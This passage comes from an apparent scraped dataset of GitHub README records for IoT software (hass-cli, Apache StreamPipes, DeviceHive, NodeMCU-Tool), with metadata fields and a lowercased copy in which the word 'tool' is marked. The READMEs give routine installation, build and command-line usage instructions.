2019-01-27t23:36:45.254266+00:00\nnote: the --sort-by argument is referring to the attribute in the underlying json/yaml not the column name. the advantage for this is that it can be used for sorting on any property even if not included in the default output.\nareas and device registry\nsince v0.87 of home assistant there is a notion of areas in the device registry. hass-cli lets you list devices and areas and assign areas to devices.\nlisting devices and areas works similar to list entities.\n$ hass-cli device list\nid name model manufacturer area\na3852c3c3ebd47d3acac195478ca6f8b basement stairs motion sml001 philips c6c962b892064a218e968fcaee7950c8\n880a944e74db4bb48ea3db6dd24af357 basement light 2 tradfri bulb gu10 ws 400lm ikea of sweden c6c962b892064a218e968fcaee7950c8\n657c3cc908594479aab819ff80d0c710 office hue white lamp philips none\n[...]\n$ hass-cli area list\nid name\n295afc88012341ecb897cd12d3fbc6b4 bathroom\n9e08d89203804d5db995c3d0d5dbd91b winter garden\n8816ee92b7b84f54bbb30a68b877e739 office\n[...]\nyou can create and delete areas:\n$ hass-cli area delete \"old shed\"\n- id: 1\ntype: result\nsuccess: true\nresult: success\n$ hass-cli area create \"new shed\"\n- id: 1\ntype: result\nsuccess: true\nresult:\narea_id: cdd09a80f03a4cc59d2943053c0414c0\nname: new shed\nyou can assign area to a specific device. here the kitchen area gets assigned to device named \"cupboard light\".\n$ hass-cli device assign kitchen \"cupboard light\"\nbesides assigning individual devices you can assign in bulk:\n$ hass-cli device assign kitchen --match \"kitchen light\"\nthe above line will assign kitchen area to all devices with substring \"kitchen light\".\nyou can also combine individual and matched devices in one line:\n$ hass-cli device assign kitchen --match \"kitchen light\" eab9930f8652408882cc8cb604651c60 cupboard\nabove will assign area named \"kitchen\" to all devices having substring \"kitchen light\" and to specific area with id \"eab9930...\" or named \"cupboard\".\nevents\nyou can subscribe and watch all or a specific event type using event watch.\n$ hass-cli event watch\nthis will watch for all event types, you can limit to a specific event type by specifying it as an argument:\n$ hass-cli event watch deconz_event\nhome assistant (former hass.io)\nif you are using home assistant (former hass.io) there are commands available for you to interact with home assistant services/systems. this includes the underlying services like the supervisor.\ncheck the supervisor release you are running:\n$ hass-cli ha supervisor info\nresult: ok\ndata:\nversion: '217'\nversion_latest: '217'\nchannel: stable\n[...]\ncheck the core release you are using at the moment:\n$ hass-cli ha core info\nresult: ok\ndata:\nversion: 0.108.2\nversion_latest: 0.108.3\n[...]\nupdate core to the latest available release:\n$ hass-cli ha core update\nother\nyou can call services:\n$ hass-cli service call deconz.device_refresh\nwith arguments:\n$ hass-cli service call homeassistant.toggle --arguments entity_id=light.office_light\nopen a map for your home assistant location:\n$ hass-cli map\nrender templates server side:\n$ hass-cli template motionlight.yaml.j2 motiondata.yaml\nrender templates client (local) side:\n$ hass-cli template --local lovelace-template.yaml\nauto-completion\nas described above you can use source <(hass-cli completion zsh) to quickly and easy enable auto completion. if you do it from your .bashrc or .zshrc it's recommend to use the form below as that does not trigger a run of hass-cli itself.\nfor zsh:\neval \"$(_hass_cli_complete=source_zsh hass-cli)\"\nfor bash:\neval \"$(_hass_cli_complete=source hass-cli)\"\nonce enabled there is autocompletion for commands and for certain attributes like entities:\n$ hass-cli state get light.<tab> \u23ce \u2731 \u25fc\nlight.kitchen_light_5 light.office_light light.basement_light_4 light.basement_light_9 light.dinner_table_light_4 light.winter_garden_light_2 light.kitchen_light_2\nlight.kitchen_table_light_1 light.hallroom_light_2 light.basement_light_5 light.basement_light_10 light.dinner_table_wall_light light.winter_garden_light_4 light.kitchen_table_light_2\nlight.kitchen_light_1 light.hallroom_light_1 light.basement_light_6 light.small_bathroom_light light.dinner_table_light_5 light.winter_garden_light_3 light.kitchen_light_4\n[...]\nnote: for this to work you'll need to have setup the following environment variables if your home assistant installation is secured and not running on localhost:8123:\nexport hass_server=http://homeassistant.local:8123\nexport hass_token=eyj0exaio-----------------------ed8mj0np8\nhelp\n$ hass-cli\nusage: hass-cli [options] command [args]...\ncommand line interface for home assistant.\noptions:\n-l, --loglevel lvl either critical, error, warning, info or\ndebug\n--version show the version and exit.\n-s, --server text the server url or `auto` for automatic\ndetection. can also be set with the\nenvironment variable hass_server. [default:\nauto]\n--token text the bearer token for home assistant\ninstance. can also be set with the\nenvironment variable hass_token.\n--password text the api password for home assistant\ninstance. can also be set with the\nenvironment variable hass_password.\n--timeout integer timeout for network operations. [default:\n5]\n-o, --output [json|yaml|table|ndjson|auto]\noutput format. [default: auto]\n-v, --verbose enables verbose mode.\n-x print backtraces when exception occurs.\n--cert text path to client certificate file (.pem) to\nuse when connecting.\n--insecure ignore ssl certificates. allow to connect to\nservers with self-signed certificates. be\ncareful!\n--debug enables debug mode.\n--columns text custom columns key=value list. example:\nentity=entity_id,\nname=attributes.friendly_name\n--no-headers when printing tables don't use headers\n(default: print headers)\n--table-format text which table format to use.\n--sort-by text sort table by the jsonpath expression.\nexample: last_changed\n--help show this message and exit.\ncommands:\narea get info and operate on areas from home assistant...\ncompletion output shell completion code for the specified shell (bash or...\nconfig get configuration from a home assistant instance.\ndevice get info and operate on devices from home assistant...\ndiscover discovery for the local network.\nentity get info on entities from home assistant.\nevent interact with events.\nha home assistant (former hass.io) commands.\ninfo get basic info from home assistant.\nmap show the location of the config or an entity on a map.\nraw call the raw api (advanced).\nservice call and work with services.\nstate get info on entity state from home assistant.\nsystem system details and operations for home assistant.\ntemplate render templates on server or locally.\nclone the git repository and\n$ pip3 install --editable .\ndevelopment\ndeveloping is (re)using as much as possible from [home assistant development setup](https://developers.home-assistant.io/docs/en/development_environment.html).\nrecommended way to develop is to use virtual environment to ensure isolation from rest of your system using the following steps:\nclone the git repository and do the following:\n$ python3 -m venv .\n$ source bin/activate\n$ script/setup\nafter this you should be able to edit the source code and running hass-cli directly:\n$ hass-cli", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000279, "year": null}, {"Unnamed: 0": 285, "autor": 285, "date": null, "content": "Self-Service Data Analytics for the (Industrial) IoT\nStreamPipes is a self-service (Industrial) IoT toolbox to enable non-technical users to connect , analyze and explore IoT data streams.\nTable of contents\nAbout Apache StreamPipes\nUse Cases\nInstallation\nBuilding StreamPipes\nPipeline Elements\nExtending StreamPipes\nBugs and Feature Requests\nGet help\nContribute\nFeedback\nLicense\nAbout Apache StreamPipes\nApache StreamPipes (incubating) enables flexible modeling of stream processing pipelines by providing a graphical modeling editor on top of existing stream processing frameworks.\nIt empowers non-technical users to quickly define and execute processing pipelines based on an easily extensible toolbox of data sources, data processors and data sinks. StreamPipes has an exchangeable runtime execution layer and executes pipelines using one of the provided wrappers, e.g., standalone or distributed in Apache Flink.\nPipeline elements in StreamPipes can be installed at runtime - the built-in SDK allows to easily implement new pipeline elements according to your needs. Pipeline elements are standalone microservices that can run anywhere - centrally on your server, in a large-scale cluster or close at the edge.\nUse Cases\nStreamPipes allows you to connect IoT data sources using the SDK or the built-in graphical tool StreamPipes Connect.\nThe extensible toolbox of data processors and sinks supports use cases such as\nContinuously store IoT data streams to third party systems (e.g., databases)\nFilter measurements on streams (e.g., based on thresholds or value ranges)\nHarmonize data by using data processors for transformations (e.g., by converting measurement units and data types or by aggregating measurements)\nDetect situations that should be avoided (e.g., patterns based on time windows)\nWrap Machine Learning models into data processors to perform classifications or predictions on sensor and image data\nVisualize real-time data from sensors and machines using the built-in Live Dashboard\nInstallation\nThe quickest way to run StreamPipes including the latest extensions (adapters, pipeline elements) is by using our Docker-based installation & operation options, namely:\nStreamPipes Compose - The User's Choice\nStreamPipes CLI - The Developer's Favorite\nStreamPipes k8s - The Operator's Dream\nNOTE: StreamPipes CLI & k8s are highly recommended for developers or operators. Standard users should stick to StreamPipes Compose.\nPlease follow the instructions provided in the corresponding README.md to get started.\nFor a more in-depth manual, read the installation guide.\nBuilding StreamPipes\nTo properly build the StreamPipes core, the following tools should be installed:\nPrerequisites\nJava 8 JDK (minimum)\nMaven (tested with 3.6)\nNodeJS + NPM (tested with v12+/ v6+)\nDocker + Docker-Compose\nBuilding\nTo build the core project, do the following:\nmvn clean package\nTo build the ui, switch to the ui folder and perform the following steps:\nnpm install\n# for NPM > v7, run npm install --legacy-peer-deps\nnpm run build\nStarting\nTo start StreamPipes, run docker-compose up -d from the root directory.\nYou can also use the installer or CLI as described in the Installation section.\nPipeline Elements\nStreamPipes includes a repository of extensions for\nConnect adapters for a variety of IoT data sources as well as\nData Processors and Data Sinks as ready-to-use pipeline elements.\nA description of the standard elements can be found in the Github repository streampipes-extensions.\nExtending StreamPipes\nYou can easily add your own data streams, processors or sinks. A Java-based SDK and several run-time wrappers for popular streaming frameworks such as Apache Flink, Apache Spark and Apache Kafka Streams (and also plain Java programs) can be used to integrate your existing processing logic into StreamPipes. Pipeline elements are packaged as Docker images and can be installed at runtime, whenever your requirements change.\nCheck our developer guide at https://streampipes.apache.org/docs/docs/dev-guide-introduction.\nBugs and Feature Requests\nIf you've found a bug or have a feature that you'd love to see in StreamPipes, feel free to create an issue in our Jira: https://issues.apache.org/jira/projects/STREAMPIPES\nGet help\nIf you have any problems during the installation or questions around StreamPipes, you'll get help through one of our community channels:\nMailing Lists\nAnd don't forget to follow us on Twitter!\nContribute\nWe welcome contributions to StreamPipes. If you are interested in contributing to StreamPipes, let us know! You'll get to know an open-minded and motivated team working together to build the next IIoT analytics toolbox.\nHere are some first steps in case you want to contribute:\nSubscribe to our dev mailing list dev-subscribe@streampipes.apache.org\nSend an email, tell us about your interests and which parts of Streampipes you'd like to contribute (e.g., core or UI)!\nAsk for a mentor who helps you understanding the code base and guides you through the first setup steps\nFind an issue in our Jira which is tagged with a newbie tag\nHave a look at our developer wiki at https://cwiki.apache.org/confluence/display/STREAMPIPES to learn more about StreamPipes development.\nHave fun!\nFeedback\nWe'd love to hear your feedback! Subscribe to users@streampipes.apache.org\nLicense\nApache License 2.0", "link": "https://github.com/apache/incubator-streampipes", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "self-service data analytics for the (industrial) iot\nstreampipes is a self-service (industrial) iot toolbox to enable non-technical users to connect , analyze and explore iot data streams.\ntable of contents\nabout apache streampipes\nuse cases\ninstallation\nbuilding streampipes\npipeline elements\nextending streampipes\nbugs and feature requests\nget help\ncontribute\nfeedback\nlicense\nabout apache streampipes\napache streampipes (incubating) enables flexible modeling of stream processing pipelines by providing a graphical modeling editor on top of existing stream processing frameworks.\nit empowers non-technical users to quickly define and execute processing pipelines based on an easily extensible toolbox of data sources, data processors and data sinks. streampipes has an exchangeable runtime execution layer and executes pipelines using one of the provided wrappers, e.g., standalone or distributed in apache flink.\npipeline elements in streampipes can be installed at runtime - the built-in sdk allows to easily implement new pipeline elements according to your needs. pipeline elements are standalone microservices that can run anywhere - centrally on your server, in a large-scale cluster or close at the edge.\nuse cases\nstreampipes allows you to connect iot data sources using the sdk or the built-in graphical -----> tool !!!  streampipes connect.\nthe extensible toolbox of data processors and sinks supports use cases such as\ncontinuously store iot data streams to third party systems (e.g., databases)\nfilter measurements on streams (e.g., based on thresholds or value ranges)\nharmonize data by using data processors for transformations (e.g., by converting measurement units and data types or by aggregating measurements)\ndetect situations that should be avoided (e.g., patterns based on time windows)\nwrap machine learning models into data processors to perform classifications or predictions on sensor and image data\nvisualize real-time data from sensors and machines using the built-in live dashboard\ninstallation\nthe quickest way to run streampipes including the latest extensions (adapters, pipeline elements) is by using our docker-based installation & operation options, namely:\nstreampipes compose - the user's choice\nstreampipes cli - the developer's favorite\nstreampipes k8s - the operator's dream\nnote: streampipes cli & k8s are highly recommended for developers or operators. standard users should stick to streampipes compose.\nplease follow the instructions provided in the corresponding readme.md to get started.\nfor a more in-depth manual, read the installation guide.\nbuilding streampipes\nto properly build the streampipes core, the following tools should be installed:\nprerequisites\njava 8 jdk (minimum)\nmaven (tested with 3.6)\nnodejs + npm (tested with v12+/ v6+)\ndocker + docker-compose\nbuilding\nto build the core project, do the following:\nmvn clean package\nto build the ui, switch to the ui folder and perform the following steps:\nnpm install\n# for npm > v7, run npm install --legacy-peer-deps\nnpm run build\nstarting\nto start streampipes, run docker-compose up -d from the root directory.\nyou can also use the installer or cli as described in the installation section.\npipeline elements\nstreampipes includes a repository of extensions for\nconnect adapters for a variety of iot data sources as well as\ndata processors and data sinks as ready-to-use pipeline elements.\na description of the standard elements can be found in the github repository streampipes-extensions.\nextending streampipes\nyou can easily add your own data streams, processors or sinks. a java-based sdk and several run-time wrappers for popular streaming frameworks such as apache flink, apache spark and apache kafka streams (and also plain java programs) can be used to integrate your existing processing logic into streampipes. pipeline elements are packaged as docker images and can be installed at runtime, whenever your requirements change.\ncheck our developer guide at https://streampipes.apache.org/docs/docs/dev-guide-introduction.\nbugs and feature requests\nif you've found a bug or have a feature that you'd love to see in streampipes, feel free to create an issue in our jira: https://issues.apache.org/jira/projects/streampipes\nget help\nif you have any problems during the installation or questions around streampipes, you'll get help through one of our community channels:\nmailing lists\nand don't forget to follow us on twitter!\ncontribute\nwe welcome contributions to streampipes. if you are interested in contributing to streampipes, let us know! you'll get to know an open-minded and motivated team working together to build the next iiot analytics toolbox.\nhere are some first steps in case you want to contribute:\nsubscribe to our dev mailing list dev-subscribe@streampipes.apache.org\nsend an email, tell us about your interests and which parts of streampipes you'd like to contribute (e.g., core or ui)!\nask for a mentor who helps you understanding the code base and guides you through the first setup steps\nfind an issue in our jira which is tagged with a newbie tag\nhave a look at our developer wiki at https://cwiki.apache.org/confluence/display/streampipes to learn more about streampipes development.\nhave fun!\nfeedback\nwe'd love to hear your feedback! subscribe to users@streampipes.apache.org\nlicense\napache license 2.0", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000285, "year": null}, {"Unnamed: 0": 291, "autor": 291, "date": null, "content": "DeviceHive Java server\nDeviceHive turns any connected device into the part of Internet of Things. It provides the communication layer, control software and multi-platform libraries to bootstrap development of smart energy, home automation, remote sensing, telemetry, remote control and monitoring software and much more.\nConnect embedded Linux using Python, Node.js or Java libraries and JSON format. Write and read your data via REST, Websockets or MQTT, explore visualization on Grafana charts.\nDevelop client applications using HTML5/JavaScript and Android libraries. Leave communications to DeviceHive and focus on actual product and innovation.\nDeviceHive license\nDeviceHive is developed by DataArt Apps and distributed under Open Source Apache 2.0. This basically means you can do whatever you want with the software as long as the copyright notice is included. This also means you don't have to contribute the end product or modified sources back to Open Source, but if you feel like sharing, you are highly encouraged to do so!\n\u00a9 Copyright 2013-2017 DataArt Apps \u00a9 All Rights Reserved\nDocker Container\nDeviceHive could be deployed manually, via Docker Compose or to Kubernetes cluster. Our suggestion is to start from Docker Compose - the easiest way to start your mastering DeviceHive capabilities. Instructions could be found here. In case you're more familiar with Kubernetes, please follow this link for detailed instructions.\nDeviceHive Java installation instructions\nThough docker-compose installation is the most developer-friendly way of running DeviceHive locally, sometimes it's required to build and start project manually. Below you can find detailed instructions on that.\nPrerequisites\nIn order to use DeviceHive framework you must have the following components installed and configured:\nPostgreSQL 9.1 or above.\nApache Kafka 0.10.0.0 or above.\nDeviceHive Websocket Proxy running (relies on Kafka, so should be started only when Kafka is up and running).\nHazelcast IMDG.\nOracle JDK 8 or OpenJDK 8.\nMaven.\nDeviceHiveJava source files. This is the main part of the DeviceHive framework.\nBuild packages\nDownload source code from GitHub using \"Download ZIP\" button. It should always point to recent stable or beta release, but you always can get any other tag or branch. It also can be done using one of Git version control client or git command line tool. If you prefer git, clone project using command\ngit clone https://github.com/devicehive/devicehive-java-server.git\nAfter that you can switch to the tag or branch you need. The list of all available releases can be found at https://github.com/devicehive/devicehive-java-server/releases. Execute following command from ${devicehive-java-server-directory}.\nmvn clean package\nIf there are no errors, compilation and packaging are completed and you can go to the next step.\nRunning Apache Kafka\nStart Zookeeper and Apache Kafka brokers as explained at official documentation (http://kafka.apache.org/documentation.html#quickstart). If your Kafka brokers are installed on the different machines, please specify their hostname/ports at app.properties file. You need to update zookeeper.connect (zookeeper's contact point) and bootstrap.servers (list of brokers) properties.\nRunning Hazelcast\nTo start, download Hazelcast IMDG 3.8.1 from official site (https://hazelcast.org/download/), extract to local drive and create in Hazelcast bin folder file hzstart.sh with following contents:\nexport JAVA_OPTS=\"$JAVA_OPTS -cp /path/to/jar/from/devicehive-hazelcast/devicehive-common-<version>-shade.jar:/path/to/HAZELCAST_HOME/lib/hazelcast-all-3.8.1.jar\"\n./start.sh\nReplace\n<serialization>\n<portable-version>0</portable-version>\n</serialization>\nwith\n<serialization>\n<portable-version>0</portable-version>\n<portable-factories>\n<portable-factory factory-id=\"1\">com.devicehive.model.DevicePortableFactory</portable-factory>\n</portable-factories>\n</serialization>\nin hazelcast.xml localted in bin folder of hazelcast. Also replace all the map and and multimap sections of hazelcast.xml with:\n<map name=\"default\">\n<eviction-policy>LRU</eviction-policy>\n</map>\n<map name=\"NOTIFICATIONS-MAP\">\n<time-to-live-seconds>120</time-to-live-seconds>\n</map>\n<map name=\"COMMANDS-MAP\">\n<time-to-live-seconds>120</time-to-live-seconds>\n</map>\n<multimap name=\"default\">\n<backup-count>0</backup-count>\n<async-backup-count>1</async-backup-count>\n<value-collection-type>SET</value-collection-type>\n</multimap>\nRun hzstart.sh.\nStarting database\nAfter you have downloaded and installed PostgreSQL (see https://wiki.postgresql.org/wiki/Detailed_installation_guides) you have to create new user. This step is required for database migrations to work properly. By default, DH expects that the username is postgres and the password is 12345. You can change this in the DH configuration files.\nCreate database with the name devicehive using user that have been created at step 1. This user should be owner of database.\nDatabase schema will be initialized on application startup.\nChecking properties\nEach microservice has its own src/main/resources/application.properties file which contains all application-level configurations (db credentials, hazelcast address, kafka props etc.). Please check them before building application in order to avoid problems at runtime.\nYou can also override these values by passing them to JVM while running java -Dapplication.property.name=application.property.name -jar. For example:\njava -Dhazelcast.cluster.members=0.0.0.1:5701 -jar ${devicehive-jar}.jar\njava -Dbootstrap.servers=0.0.0.1:9092 -jar ${devicehive-jar}.jar\njava -Dproxy.connect=0.0.0.1:3000 -jar ${devicehive-jar}.jar\nDB connection properties are managed inside devicehive-rdbms-dao/src/main/resources/application-persistence.properties. To override them do the same:\njava -Dspring.datasource.url=jdbc:postgresql://0.0.0.1:5432/devicehive -jar ${devicehive-jar}.jar\njava -Dspring.datasource.username=test -Dspring.datasource.password=test -jar ${devicehive-jar}.jar\nRunning application\nDeviceHive ecosystem contains of 3 mandatory and 1 optional services, namely Backend, Frontend, Auth and Plugin management (optional) micro services.\nTo start application, first run following command:\njava -jar ${devicehive-java-server-directory}/devicehive-backend/target/devicehive-backend-<version>-boot.jar\nThis will start Backend. Wait for the application to start, then run:\njava -jar ${devicehive-java-server-directory}/devicehive-frontend/target/devicehive-frontend-<version>-boot.jar\nand\njava -jar ${devicehive-java-server-directory}/devicehive-auth/target/devicehive-auth-<version>-boot.jar\nThis will start embedded undertow application server on default port 8080 and deploy DeviceHive application. You can visit http://localhost:8080/dh/swagger from your web browser to start learning the frontend's APIs. Also you can visit http://localhost:8090/dh/swagger from your web browser to start learning the auth's APIs.\nFor devicehive-frontend and devicehive-backend logging level can be changed by adding the following properties to the command above:\n-Droot.log.level=value1 -Dcom.devicehive.log.level=value2\nThe values can be: TRACE, DEBUG, INFO, WARN, ERROR. If the properties are absent the default values will be used. For devicehive-frontend and devicehive-auth default values for value1 and value2 are WARN and INFO correspondingly. For devicehive-backend the default value for both is INFO.\nPlugin management service\nThere's one optional service inside DeviceHive ecosystem - Plugin Management service. It allows to register and to update DeviceHive plugins (that allow customers to implement their own business logic without diving into DeviceHive source code) via RESTful API.\nTo start it simply run following command:\njava -jar ${devicehive-java-server-directory}/devicehive-plugin/target/devicehive-plugin-<version>-boot.jar\nService will be started on 8110 port by default, so you can visit its swagger at http://localhost:8110/dh/swagger", "link": "https://github.com/devicehive/devicehive-java-server", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "devicehive java server\ndevicehive turns any connected device into the part of internet of things. it provides the communication layer, control software and multi-platform libraries to bootstrap development of smart energy, home automation, remote sensing, telemetry, remote control and monitoring software and much more.\nconnect embedded linux using python, node.js or java libraries and json format. write and read your data via rest, websockets or mqtt, explore visualization on grafana charts.\ndevelop client applications using html5/javascript and android libraries. leave communications to devicehive and focus on actual product and innovation.\ndevicehive license\ndevicehive is developed by dataart apps and distributed under open source apache 2.0. this basically means you can do whatever you want with the software as long as the copyright notice is included. this also means you don't have to contribute the end product or modified sources back to open source, but if you feel like sharing, you are highly encouraged to do so!\n\u00a9 copyright 2013-2017 dataart apps \u00a9 all rights reserved\ndocker container\ndevicehive could be deployed manually, via docker compose or to kubernetes cluster. our suggestion is to start from docker compose - the easiest way to start your mastering devicehive capabilities. instructions could be found here. in case you're more familiar with kubernetes, please follow this link for detailed instructions.\ndevicehive java installation instructions\nthough docker-compose installation is the most developer-friendly way of running devicehive locally, sometimes it's required to build and start project manually. below you can find detailed instructions on that.\nprerequisites\nin order to use devicehive framework you must have the following components installed and configured:\npostgresql 9.1 or above.\napache kafka 0.10.0.0 or above.\ndevicehive websocket proxy running (relies on kafka, so should be started only when kafka is up and running).\nhazelcast imdg.\noracle jdk 8 or openjdk 8.\nmaven.\ndevicehivejava source files. this is the main part of the devicehive framework.\nbuild packages\ndownload source code from github using \"download zip\" button. it should always point to recent stable or beta release, but you always can get any other tag or branch. it also can be done using one of git version control client or git command line -----> tool !!! . if you prefer git, clone project using command\ngit clone https://github.com/devicehive/devicehive-java-server.git\nafter that you can switch to the tag or branch you need. the list of all available releases can be found at https://github.com/devicehive/devicehive-java-server/releases. execute following command from ${devicehive-java-server-directory}.\nmvn clean package\nif there are no errors, compilation and packaging are completed and you can go to the next step.\nrunning apache kafka\nstart zookeeper and apache kafka brokers as explained at official documentation (http://kafka.apache.org/documentation.html#quickstart). if your kafka brokers are installed on the different machines, please specify their hostname/ports at app.properties file. you need to update zookeeper.connect (zookeeper's contact point) and bootstrap.servers (list of brokers) properties.\nrunning hazelcast\nto start, download hazelcast imdg 3.8.1 from official site (https://hazelcast.org/download/), extract to local drive and create in hazelcast bin folder file hzstart.sh with following contents:\nexport java_opts=\"$java_opts -cp /path/to/jar/from/devicehive-hazelcast/devicehive-common-<version>-shade.jar:/path/to/hazelcast_home/lib/hazelcast-all-3.8.1.jar\"\n./start.sh\nreplace\n<serialization>\n<portable-version>0</portable-version>\n</serialization>\nwith\n<serialization>\n<portable-version>0</portable-version>\n<portable-factories>\n<portable-factory factory-id=\"1\">com.devicehive.model.deviceportablefactory</portable-factory>\n</portable-factories>\n</serialization>\nin hazelcast.xml localted in bin folder of hazelcast. also replace all the map and and multimap sections of hazelcast.xml with:\n<map name=\"default\">\n<eviction-policy>lru</eviction-policy>\n</map>\n<map name=\"notifications-map\">\n<time-to-live-seconds>120</time-to-live-seconds>\n</map>\n<map name=\"commands-map\">\n<time-to-live-seconds>120</time-to-live-seconds>\n</map>\n<multimap name=\"default\">\n<backup-count>0</backup-count>\n<async-backup-count>1</async-backup-count>\n<value-collection-type>set</value-collection-type>\n</multimap>\nrun hzstart.sh.\nstarting database\nafter you have downloaded and installed postgresql (see https://wiki.postgresql.org/wiki/detailed_installation_guides) you have to create new user. this step is required for database migrations to work properly. by default, dh expects that the username is postgres and the password is 12345. you can change this in the dh configuration files.\ncreate database with the name devicehive using user that have been created at step 1. this user should be owner of database.\ndatabase schema will be initialized on application startup.\nchecking properties\neach microservice has its own src/main/resources/application.properties file which contains all application-level configurations (db credentials, hazelcast address, kafka props etc.). please check them before building application in order to avoid problems at runtime.\nyou can also override these values by passing them to jvm while running java -dapplication.property.name=application.property.name -jar. for example:\njava -dhazelcast.cluster.members=0.0.0.1:5701 -jar ${devicehive-jar}.jar\njava -dbootstrap.servers=0.0.0.1:9092 -jar ${devicehive-jar}.jar\njava -dproxy.connect=0.0.0.1:3000 -jar ${devicehive-jar}.jar\ndb connection properties are managed inside devicehive-rdbms-dao/src/main/resources/application-persistence.properties. to override them do the same:\njava -dspring.datasource.url=jdbc:postgresql://0.0.0.1:5432/devicehive -jar ${devicehive-jar}.jar\njava -dspring.datasource.username=test -dspring.datasource.password=test -jar ${devicehive-jar}.jar\nrunning application\ndevicehive ecosystem contains of 3 mandatory and 1 optional services, namely backend, frontend, auth and plugin management (optional) micro services.\nto start application, first run following command:\njava -jar ${devicehive-java-server-directory}/devicehive-backend/target/devicehive-backend-<version>-boot.jar\nthis will start backend. wait for the application to start, then run:\njava -jar ${devicehive-java-server-directory}/devicehive-frontend/target/devicehive-frontend-<version>-boot.jar\nand\njava -jar ${devicehive-java-server-directory}/devicehive-auth/target/devicehive-auth-<version>-boot.jar\nthis will start embedded undertow application server on default port 8080 and deploy devicehive application. you can visit http://localhost:8080/dh/swagger from your web browser to start learning the frontend's apis. also you can visit http://localhost:8090/dh/swagger from your web browser to start learning the auth's apis.\nfor devicehive-frontend and devicehive-backend logging level can be changed by adding the following properties to the command above:\n-droot.log.level=value1 -dcom.devicehive.log.level=value2\nthe values can be: trace, debug, info, warn, error. if the properties are absent the default values will be used. for devicehive-frontend and devicehive-auth default values for value1 and value2 are warn and info correspondingly. for devicehive-backend the default value for both is info.\nplugin management service\nthere's one optional service inside devicehive ecosystem - plugin management service. it allows to register and to update devicehive plugins (that allow customers to implement their own business logic without diving into devicehive source code) via restful api.\nto start it simply run following command:\njava -jar ${devicehive-java-server-directory}/devicehive-plugin/target/devicehive-plugin-<version>-boot.jar\nservice will be started on 8110 port by default, so you can visit its swagger at http://localhost:8110/dh/swagger", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000291, "year": null}, {"Unnamed: 0": 293, "autor": 293, "date": null, "content": "NodeMCU-Tool\nUpload/Download Lua files to your ESP8266/ESP32 module with NodeMCU firmware.\nSimple. Command Line. Cross-Platform. File Management. NodeMCU.\n$ npm install nodemcu-tool -g\nTool Summary\nNodeMCU Tool allows you to\nUpload Lua files to your ESP8266/ESP32/NodeMCU module\nUpload any file-types (binary save)\nBulk/Multi file uploads\nDownload any file-type (binary save)\nDelete files\nFormat the file system\nSimple Serial Terminal to interact with NodeMCU\nShow existing files on your module\nPrecompile Lua files live on NodeMCU\nMinimize Lua files before uploading (provided by luamin)\nUse the NodeMcuConnector API in your own projects\nApply Project based configurations\nHard-Reset the module using DTR/RTS reset circuit (like NodeMCU DEV Kit)\nRun files on NodeMCU and display the output\ndirectly from the command line.\nSuccessful tested on Windows10, Debian 8,9,10 and Ubuntu 14,15,16,17,18 - works out of the box without any tweaks\nCompatibility\nThe following NodeMCU firmware versions are verified\nESP8266\nNodeMCU Lua 1.4\nNodeMCU Lua 1.5.1\nNodeMCU Lua 1.5.4\nNodeMCU Lua 3.0.0\nESP32\npreliminary support (esp32-dev.latest)\nRelated Documents\nFAQ\nCommand Reference\nCommon Use-Cases and Examples\nProgrammatic Usage\nBehind The Scene\nFixing Reset-on-Connect Issue\nFile Transfer Encoding\nWebstorm Integration\nContribution Guidelines\nNodeMCU DEVKIT Schematics\nChangelog\nLicense\nTerminology\nNodeMCU Original NodeMCU Module OR any ESP8266 platform with NodeMCU Firmware\nUpload Transfer files from your PC to NodeMCU/ESP8266 module\nDownload Transfer files/obtaining information from the module\nRequirements\nTo use/install the NodeMCU-Tool, you have to prepare your system to match the following requirements. Especially as beginner, you should read this part carefully\nNodeMCU Serial Driver\nDepending on your Module-Type you have to install the platform-specific driver for the usb-serial-interface. The original NodeMCU v0.9 comes with a CH341 chip with may requires manual driver installation. Modern versions like 1.0 use a CP210x chip with work out of the box on most common systems. Other ESP8266 platforms may user other interfaces - please refer to their user manuals!\nNode.js\nThe NodeMCU-Tool is written in javascript and requires Node.js >= 7.6 as runtime environment. And please don't worry about the wording - NodeMCU and Node.js are two complete different things!\n!! There is currently an issue with Node.js 11 on Windows 10 platforms. Please use Node.js 10 LTS !!\nIn case you're not familiar with Node.js and NPM it's recommended to read some basic introductions first! Please download the Node.js installer and install on your system in case it's not already there.\nInstallation\nThanks to Node.js, the NodeMCU-Tool is platform independent and will run on Windows, Linux und OSX. There are different installation variants available (system wide or project based).\nvia NPM (Node.js Package Manager)\nIt's recommended to install nodemcu-tool as global package. NPM will register the binary automatically in your path - it will be directly available on the command line.\nGlobal Installation as root (Linux/Mac OS Platforms)\nThe global installation may require administrator(root) privileges because the package is added to the systems library path. If you get any permission errors on Linux/Mac OS run the command as root or via sudo.\nNote: In some special cases the installation may fail with some errors related to node-serialport or node-gyp. This errors are caused by missing pre-build binaries (native code/drivers for your platform matching your OS/nodejs version) - therefore they have to compiled on your machine! To resolve such issues, add the --unsafe-perm flag to the following command - it allows the build scripts to be executed as root.\n$ sudo npm install nodemcu-tool -g\nGlobal Installation (Windows Platforms)\n$ npm install nodemcu-tool -g\nLocal/Project related Installation\nYou can also install it in your local project directory. When using this method, the nodemcu-tool command is not registered within your path!\n$ npm install nodemcu-tool\nIn this case, a link to the binary file is located in node_modules/.bin/nodemcu-tool\nAs Archive from GitHub\nYou can also download the latest release directly from GitHub and extract the sources to your project directory. After downloading you have to install the dependencies by running npm install in the nodemcu-tool directory.\nWhen using this method, the nodemcu-tool command is not registered within your path. You have to register it manually using a symlink - or the recommended way: call the binary file ./bin/nodemcu-tool.js directly.\nFirst Steps\n1. The Location of the binary file\nAfter installing NodeMCU-Tool you should open a new terminal window and check if the tool is working by obtaining the current version. It should output the current semantic-version tag. Depending on your installation type (global ==> file is registered into your path) you can use the tool directly or you have to go into the module directory:\nFor Global Installations (Win/Linux/OSX)\nThe binary file is registered within your path. This tutorial assumes that you have installed the tool globally. Otherwise you have to modify the program-call as described below.\n$ nodemcu-tool --version\n1.5.0\nFor Local Installations\nThis means you have installed nodemcu-tool via NPM without the -g (global) flag or via the .zip / .tar package. There will be no global shortcut to the nodemcu-tool binary! The binary is located in 